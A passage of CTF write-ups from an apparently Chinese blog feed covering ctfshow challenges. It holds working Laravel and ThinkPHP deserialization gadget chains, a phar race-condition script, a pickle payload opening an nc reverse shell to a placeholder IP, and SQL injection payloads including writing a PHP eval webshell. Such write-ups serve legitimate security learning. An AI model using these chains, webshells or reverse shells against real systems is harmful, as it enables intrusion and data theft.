\"echo '&lt;?php eval(\\$_POST[1]); ?&gt;' &gt; 1.php\");\n    echo(base64_encode(serialize($exp)));\n}\n</code></pre>\n<h1 id=\"web-271\"><a href=\"#web-271\" class=\"headerlink\" title=\"web 271\"></a>web 271</h1><p>laravel5.7 反序列化漏洞</p>\n<pre><code class=\"php\">&lt;?php\n\nnamespace Illuminate\\Foundation\\Testing {\n    class PendingCommand\n    {\n        public $test;\n        protected $app;\n        protected $command;\n        protected $parameters;\n\n        public function __construct($test, $app, $command, $parameters)\n        {\n            $this-&gt;test = $test;                 // 一个实例化的类 Illuminate\\Auth\\GenericUser\n            $this-&gt;app = $app;                   // 一个实例化的类 Illuminate\\Foundation\\Application\n            $this-&gt;command = $command;           // 要执行的 php 函数 system\n            $this-&gt;parameters = $parameters;     // 要执行的 php 函数的参数  array ('id')\n        }\n    }\n}\n\nnamespace Faker {\n    class DefaultGenerator\n    {\n        protected $default;\n\n        public function __construct($default = null)\n        {\n            $this-&gt;default = $default;\n        }\n    }\n}\n\nnamespace Illuminate\\Foundation {\n    class Application\n    {\n        protected $instances = [];\n\n        public function __construct($instances = [])\n        {\n            $this-&gt;instances['Illuminate\\Contracts\\Console\\Kernel'] = $instances;\n        }\n    }\n}\n\nnamespace {\n    $defaultgenerator = new Faker\\DefaultGenerator(array(\"hello\" =&gt; \"world\"));\n\n    $app = new Illuminate\\Foundation\\Application();\n\n    $application = new Illuminate\\Foundation\\Application($app);\n\n    $pendingcommand = new Illuminate\\Foundation\\Testing\\PendingCommand($defaultgenerator, $application, 'system', array('whoami'));\n\n    echo urlencode(serialize($pendingcommand));\n}\n</code></pre>\n<h1 id=\"web-272、273\"><a href=\"#web-272、273\" class=\"headerlink\" title=\"web 272、273\"></a>web 272、273</h1><p>laravel5.8 反序列化漏洞</p>\n<pre><code class=\"php\">&lt;?php\n/*\nAuthor:monitor\ndescription:\n    laravel deserialization chain\n*/\nnamespace Illuminate\\Broadcasting\n{\n    class PendingBroadcast{\n        protected $events;\n        protected $event;\n        public function __construct($events,$event)\n        {\n            $this-&gt;events = $events;\n            $this-&gt;event = $event;\n        }\n    }\n}\n\nnamespace Illuminate\\Bus\n{\n    class Dispatcher{\n        protected $queueResolver;\n        public function __construct($queueResolver)\n        {\n            $this-&gt;queueResolver = $queueResolver;\n        }\n    }\n}\n\nnamespace Mockery\\Loader\n{\n    class EvalLoader{\n\n    }\n}\n\nnamespace Mockery\\Generator\n{\n    class MockDefinition{\n        protected $config;\n        protected $code;\n        public function __construct($config,$code){\n            $this-&gt;config = $config;\n            $this-&gt;code = $code;\n        }\n    }\n    class MockConfiguration{\n        protected $name;\n        public function __construct($name)\n        {\n            $this-&gt;name = $name;\n        }\n    }\n}\n\nnamespace Illuminate\\Queue\n{\n    class CallQueuedClosure{\n        public $connection;\n        public function __construct($connection)\n        {\n            $this-&gt;connection = $connection;\n        }\n    }\n}\n\nnamespace\n{   \n    if($argc&lt;2){\n        echo \"Description:\\n\\tUse laravel deserialization to eval php code,don't need to input php tags.\";\n        echo \"\\nUsage:\" .$argv[0] . \" &lt;code&gt;\";\n        exit();\n    }\n    $code = $argv[1];\n    $mockconfiguration = new Mockery\\Generator\\MockConfiguration(\"pass\");\n    $mockdefination = new Mockery\\Generator\\MockDefinition($mockconfiguration,\"&lt;?php \".$code.\" exit;?&gt;\");\n    $callqueuedclosure = new Illuminate\\Queue\\CallQueuedClosure($mockdefination);\n    $evaload = new Mockery\\Loader\\EvalLoader();\n    $dispatcher = new Illuminate\\Bus\\Dispatcher(array($evaload,\"load\"));\n    $pendingbroadcast = new Illuminate\\Broadcasting\\PendingBroadcast($dispatcher,$callqueuedclosure);\n    echo urlencode(serialize($pendingbroadcast));\n}\n</code></pre>\n<p>xxxxxxxxxx&nbsp;0;alter table ctfshow_user change <code>username</code> <code>pass2</code> varchar(100);alter table ctfshow_user change <code>pass</code> <code>username</code> varchar(100);alter table ctfshow_user change <code>pass2</code> <code>pass</code> varchar(100);sql</p>\n<h1 id=\"web-274\"><a href=\"#web-274\" class=\"headerlink\" title=\"web 274\"></a>web 274</h1><p>thinkphp 5.1 反序列化漏洞</p>\n<pre><code class=\"php\">&lt;?php\nnamespace think;\nabstract class Model{\n    protected $append = [];\n    private $data = [];\n    function __construct(){\n        $this-&gt;append = [\"lin\"=&gt;[\"calc.exe\",\"calc\"]];\n        $this-&gt;data = [\"lin\"=&gt;new Request()];\n    }\n}\nclass Request\n{\n    protected $hook = [];\n    protected $filter = \"system\";\n    protected $config = [\n        // 表单 ajax 伪装变量\n        'var_ajax'         =&gt; '_ajax',  \n    ];\n    function __construct(){\n        $this-&gt;filter = \"system\";\n        $this-&gt;config = [\"var_ajax\"=&gt;'lin'];\n        $this-&gt;hook = [\"visible\"=&gt;[$this,\"isAjax\"]];\n    }\n}\n\n\nnamespace think\\process\\pipes;\n\nuse think\\model\\concern\\Conversion;\nuse think\\model\\Pivot;\nclass Windows\n{\n    private $files = [];\n\n    public function __construct()\n    {\n        $this-&gt;files=[new Pivot()];\n    }\n}\nnamespace think\\model;\n\nuse think\\Model;\n\nclass Pivot extends Model\n{\n}\nuse think\\process\\pipes\\Windows;\necho base64_encode(serialize(new Windows()));\n?&gt;\n</code></pre>\n<p><code>$lin</code> GET 赋值</p>\n<h1 id=\"web-275\"><a href=\"#web-275\" class=\"headerlink\" title=\"web 275\"></a>web 275</h1><p><code>__destruct</code>当对象被销毁时调用，所以我们不需要用到反序列化函数。那么只要<code>$this-&gt;evilfile</code>是<code>true</code>就可以执行系统命令了。最后再拼接一下命令<br>payload</p>\n<pre><code class=\"php\">?fn=;cat f*\ndata: flag=123\n</code></pre>\n<h1 id=\"web-276\"><a href=\"#web-276\" class=\"headerlink\" title=\"web 276\"></a>web 276</h1><p>在上个题的基础上增了了判断<code>$this-&gt;admin</code>所以真的需要我们去通过反序列化修改<code>admin</code>的值了。因为题目中没有反序列化函数，所以需要通过其他方式。<br>因为题目中有写文件的函数，所以可以通过<code>file_put_contents</code>写<code>phar</code>文件，然后再通过<code>file_put_contents</code>触发<code>phar</code>反序列化。当然我们得在删除文件前执行完这两个操作，所以需要用到条件竞争。<br>生成<code>phar</code>文件</p>\n<pre><code class=\"php\">&lt;?php\n\nclass filter{\n    public $filename = \"1|cat f*\";\n    public $filecontent;\n    public $evilfile = true;\n    public $admin = true;\n}\n\n$phar = new Phar(\"phar.phar\");\n$phar-&gt;startBuffering();\n$phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\");\n\n$o = new filter();\n$phar-&gt;setMetadata($o);\n$phar-&gt;addFromString(\"test.txt\", \"test\");\n$phar-&gt;stopBuffering();\n</code></pre>\n<p>条件竞争</p>\n<pre><code class=\"python\">import requests\nimport threading\nimport base64\nurl = 'http://b1238473-a3bb-431f-a39e-3cd285bcb95e.chall.ctf.show/'\n\nf = open('./phar.phar', 'rb')\n\ndata = f.read()\nflag = False\n\ndef work1():\n    requests.post(url+\"?fn=a\", data=data)\n\n\ndef work2():\n    global flag\n    r = requests.post(url+\"?fn=phar://phar.phar/\", data=\"\")\n    if \"flag{\" in r.text and flag is False:\n        print(base64.b64encode(r.text.encode()))\n        flag = True\n\nwhile flag is False:\n    a = threading.Thread(target=work1)\n    b = threading.Thread(target=work2)\n    a.start()\n    b.start()\n</code></pre>\n<h1 id=\"web-277-278\"><a href=\"#web-277-278\" class=\"headerlink\" title=\"web 277 278\"></a>web 277 278</h1><pre><code class=\"python\">import pickle\nimport base64\nclass A(object):\n    def __reduce__(self):\n        return(eval,('__import__(\"os\").popen(\"nc xxx.xxx.xxx.xxx 4567 -e /bin/sh\").read()',))\na=A()\ntest=pickle.dumps(a)\nprint(base64.b64encode(test))\n</code></pre>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/35cb7ca5/",
            "url": "http://dpm12345.cn/posts/35cb7ca5/",
            "title": "SQL 注入",
            "date_published": "2022-10-04T14:15:40.000Z",
            "content_html": "<ul>\n<li>\n<p>若对返回值进行过滤</p>\n<ul>\n<li>\n<p>可以在该字段名前加上 <code>hex()</code>  十六进制编码</p>\n</li>\n<li>\n<p>使用 replace 函数，对返回结果进行替换，绕过 waf，得到替换结果后再替换回来</p>\n</li>\n</ul>\n</li>\n<li>\n<p>sql 注入也可以将内容写入到外部文件中，</p>\n<p>如 <code>select \"&lt;?php eval($_POST[1]);?&gt;\" into outfile '/var/www/html/1.php'</code></p>\n<p>为了防止失败，可对 php 语句进行编码 <code>(base64+url)</code></p>\n<p>之后访问 1.php，可以发现成功，然后使用蚁剑连接，进行数据操作，然后新建数据库 (信息在根目录下 <code>api</code>  下的 <code>config.php</code>  文件中)</p>\n<p>之后找到 flag</p>\n</li>\n<li>\n<p>如果过滤 sql 语句中的某个值，如 <code>username=flag</code> ，而 flag 被过滤，那么可以使用 <code>like+通配符</code> 的方法，如 <code>like '%fla%'</code></p>\n<p>其中 <code>%</code>  匹配任意个字符， <code>_</code> 匹配一个字符，同样也可以使用十六进制编码</p>\n<p>如 <code>select id,username,password from users where username=0x666c6167;</code>  也是可以的，查询出 <code>username='flag'</code>  的情况</p>\n<p>或者用 <code>base64</code>  编码</p>\n</li>\n<li>\n<p>where 被过滤可以使用 having，同 where 用法</p>\n</li>\n<li>\n<p>若 ban 了数字，那么可以使用 <code>true，false</code>  来代替 <code>1 和 0</code> ，然后利用加法构建任意数字，接着利用 <code>concat</code>  函数拼接字符串，从而生成无数字的语句的 (但实际上包含语句)，如</p>\n<p><code>select username,password from users where id=concat(true,true);</code></p>\n<p>等价于 <code>select username,password from users where id='11';</code></p>\n</li>\n<li>\n<p>对于 select 的查询语句</p>\n<p><code>select count(*) from users where username='8' or 'a23';</code></p>\n<p>返回结果是 0</p>\n<p><code>select count(*) from users where username='8' or '1a';</code></p>\n<p>返回结果是数据条数</p>\n<p><code>select count(*) from users where username='8' or '1';</code></p>\n<p>返回结果是数据条数</p>\n<p><code>select count(*) from users where username='8' or '0';</code></p>\n<p>返回结果是 0</p>\n<p>那么也就是说，在 or 语句中，0，字母开头的为非，数字开头的为正</p>\n<p>可利用该特性进行 SQL 注入</p>\n</li>\n<li>\n<p>sql 语句的查询机制</p>\n</li>\n<li>\n<p>如 sql 语句 <code>select username,password from users where username='flag';</code></p>\n<p>它将会返回 <code>username</code>  为 <code>flag</code>  的值的数据</p>\n<p>但如果此时将 <code>username='flag'</code>  换为 <code>username=0</code>  后，是否还能查到 flag 呢？</p>\n<p>答案是肯定的，这是因为，这里的等于是弱等于，</p>\n</li>\n<li>\n<p>substr 如果被禁了，可以使用 left 代替，其中 left 只有两个参数，第一个为字符串，第二个为个数，即从最左端开始</p>\n<p>如 <code>select left(\"abc\",2);</code>  返回 <code>ab</code></p>\n<p>或者也可以使用 <code>lpad</code> ，其有三个参数</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>LPAD<span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">,</span>len<span class=\"token punctuation\">,</span>padstr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">Returns</span> the string str<span class=\"token punctuation\">,</span> <span class=\"token keyword\">left</span><span class=\"token operator\">-</span>padded <span class=\"token keyword\">with</span> the string padstr <span class=\"token keyword\">to</span> a length <span class=\"token keyword\">of</span> len characters<span class=\"token punctuation\">.</span> <span class=\"token keyword\">If</span> str <span class=\"token operator\">is</span> longer than len<span class=\"token punctuation\">,</span> the <span class=\"token keyword\">return</span> <span class=\"token keyword\">value</span> <span class=\"token operator\">is</span> shortened <span class=\"token keyword\">to</span> len characters<span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>mysql<span class=\"token operator\">&gt;</span> <span class=\"token keyword\">SELECT</span> LPAD<span class=\"token punctuation\">(</span><span class=\"token string\">'hi'</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'??'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span> <span class=\"token string\">'??hi'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>mysql<span class=\"token operator\">&gt;</span> <span class=\"token keyword\">SELECT</span> LPAD<span class=\"token punctuation\">(</span><span class=\"token string\">'hi'</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">'??'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span> <span class=\"token string\">'h'</span></pre></td></tr></tbody></table></figure><p>那么可以 <code>lpad(\"abc\",2,\"\");</code>  达到与 left 同样效果</p>\n</li>\n<li>\n<p>时间盲注</p>\n<p><strong>sleep(3)</strong> 直截了当的时间盲注</p>\n<p><strong>benchmark()</strong></p>\n<p>The BENCHMARK() function executes the expression expr repeatedly count times. It may be used to time how quickly MySQL processes the expression. The result value is 0, or NULL for inappropriate arguments such as a NULL or negative repeat count.</p>\n<p><strong>rlike</strong> 正则匹配</p>\n<p><strong>多次查询排序</strong></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>ip<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">and</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">&gt;</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> table_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span><span class=\"token punctuation\">)</span>a<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> table_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span><span class=\"token punctuation\">)</span>b<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> table_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">limit</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span>c<span class=\"token punctuation\">)</span> <span class=\"token keyword\">limit</span> <span class=\"token number\">1</span></pre></td></tr></tbody></table></figure></li>\n</ul>\n<h1 id=\"web-171\"><a class=\"anchor\" href=\"#web-171\">#</a> web 171</h1>\n<p>根据查询语句</p>\n<p><code>$sql = \"select username,password from user where username !='flag' and id = '\".$_GET['id'].\"' limit 1;\";</code>  可知可用单引号闭合，然后利用 or 的特性</p>\n<p><code>0' or username='flag'%23</code></p>\n<p>查找到 flag</p>\n<h1 id=\"web-172\"><a class=\"anchor\" href=\"#web-172\">#</a> web 172</h1>\n<p>使用联合注入</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 检查结果是否有 flag</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span><span class=\"token operator\">!==</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'查询成功'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p><code>' union select 1,password from ctfshow_user2 where username ='flag'%23</code></p>\n<h1 id=\"web-173\"><a class=\"anchor\" href=\"#web-173\">#</a> web 173</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/flag/i'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'查询成功'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>同上题</p>\n<p><code>' union select 1,2,password from ctfshow_user3 where username ='flag'%23</code></p>\n<h1 id=\"web-174\"><a class=\"anchor\" href=\"#web-174\">#</a> web 174</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/flag/i'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'查询成功'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>这题使用 <code>replace</code>  函数对数字进行替换</p>\n<p>注意需要抓包，因为内容过长，正常提交不上去，同时 url 编码</p>\n<p><code>'%20union%20select%20'a'%2Creplace(replace(replace(replace(replace(replace(replace(replace(replace(replace((b.password)%2C'0'%2C'!')%2C'1'%2C'%23')%2C'2'%2C'%24')%2C'3'%2C'%25')%2C'4'%2C'%26')%2C'5'%2C'(')%2C'6'%2C')')%2C'7'%2C'*')%2C'8'%2C'%2B')%2C'9'%2C'%2C')%20from%20ctfshow_user4%20as%20b%20where%20b.username%3D'flag'%23</code></p>\n<h1 id=\"web-175\"><a class=\"anchor\" href=\"#web-175\">#</a> web 175</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 检查结果是否有 flag</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[\\x00-\\x7f]/i'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'查询成功'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>过滤了所有 ASCII 字符</p>\n<p>写文件</p>\n<p><code>'%20union%20select%201%2C%22%3C%3Fphp%20eval(%24_POST%5B1%5D)%3B%22%20into%20outfile%20%22%2Fvar%2Fwww%2Fhtml%2F1.php%22%23</code></p>\n<p>然后蚁剑连接，进入数据库，查询 flag  <code>select password from ctfshow_user5 where username='flag';</code></p>\n<h1 id=\"web-176\"><a class=\"anchor\" href=\"#web-176\">#</a> web 176</h1>\n<p><code>0' or username='flag'%23</code></p>\n<h1 id=\"web-177\"><a class=\"anchor\" href=\"#web-177\">#</a> web 177</h1>\n<p>过滤了空格</p>\n<p><code>0'/**/or/**/username='flag'%23</code></p>\n<h1 id=\"web-178\"><a class=\"anchor\" href=\"#web-178\">#</a> web 178</h1>\n<p>前面的空格绕过用不了，这里使用 <code>%0a</code>  和括号绕过</p>\n<p><code>0'union%0aselect'1','2',(select(password)from(ctfshow_user)where(username='flag'))%23</code></p>\n<p>或者仅仅用括号</p>\n<p><code>0'or(username='flag')%23</code></p>\n<h1 id=\"web-179\"><a class=\"anchor\" href=\"#web-179\">#</a> web 179</h1>\n<p>同上一题做法</p>\n<h1 id=\"web-180\"><a class=\"anchor\" href=\"#web-180\">#</a> web 180</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select id,username,password from ctfshow_user where username !='flag' and id = '\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"' limit 1;\"</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><h2 id=\"解法一\"><a class=\"anchor\" href=\"#解法一\">#</a> 解法一</h2>\n<p><code>0'union%0cselect'1','2',(select(password)from(ctfshow_user)where(username='flag'))'</code></p>\n<p>由于过滤了 <code>--+</code>  和 <code>#</code> ，只能使用闭合</p>\n<h2 id=\"解法二\"><a class=\"anchor\" href=\"#解法二\">#</a> 解法二</h2>\n<p><code>0'or(username='flag')and'2</code></p>\n<p>原理是运用了 sql 语句的判断优先级，与原查询语句组合后，得到 <code>select id,username,password from ctfshow_user where username !='flag' and id = 0'or(username='flag')and'2' limit 1;</code></p>\n<p><code>username!='flag' and id=0</code>  和 <code>username='flag' and '2'</code>  作为两个条件进行判断，因此可以返回结果</p>\n<h1 id=\"web-181\"><a class=\"anchor\" href=\"#web-181\">#</a> web 181</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0|\\x23|\\#|file|into|select/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>用上一题的解法二即可</p>\n<h1 id=\"web-182\"><a class=\"anchor\" href=\"#web-182\">#</a> web 182</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0|\\x23|\\#|file|into|select|flag/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>过滤了 flag，前面的 <code>username='flag'</code>  用不了，这里可以使用正则 <code>0'or(username)regexp'f'and'2</code></p>\n<p>或者根据前面做题，知 flag 始终在 id 为 26 的地方，故可以使用 <code>id=26</code> , 即 <code>0'or(id=26)and'2</code></p>\n<h1 id=\"web-183\"><a class=\"anchor\" href=\"#web-183\">#</a> web 183</h1>\n<p>``</p>\n<h1 id=\"web-184\"><a class=\"anchor\" href=\"#web-184\">#</a> web 184</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 查询语句</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select count(*) from \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tableName'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\";\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">// 返回逻辑</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\x00|\\#|\\x23|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\'|\\\"|union|\\`|sleep|benchmark/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// 查询结果</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">// 返回用户表的记录总数</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$user_count</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><h1 id=\"web-185\"><a class=\"anchor\" href=\"#web-185\">#</a> web 185</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select count(*) from \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tableName'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\";\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">function</span> 